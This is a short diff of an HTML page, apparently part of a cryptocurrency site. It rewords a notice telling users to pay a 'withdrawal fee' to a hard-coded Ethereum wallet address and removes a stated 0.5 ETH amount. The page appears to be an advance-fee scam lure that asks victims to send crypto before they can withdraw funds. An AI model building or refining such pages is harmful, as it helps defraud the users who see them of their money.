@@ -36,7 +36,7 @@
                 </div>
                 <!-- Wallet Address -->
                 <div class="p-4 mb-4 text-center bg-gray-100 rounded-lg">
-                    <p class="font-semibold text-gray-700">Make a withdrawal fee payment of 0.5ETH to the following wallet address:</p>
+                    <p class="font-semibold text-gray-700">Make your withdrawal fee payment to the following wallet address:</p>
                     <input type="text" value="0x66c51220d48ccCA297cC98C51BBFAaC37C416e6e" readonly
                         class="w-full p-3 mt-2 font-semibold text-center text-indigo-600 bg-indigo-100 border border-indigo-300 rounded-lg">
                 </div>
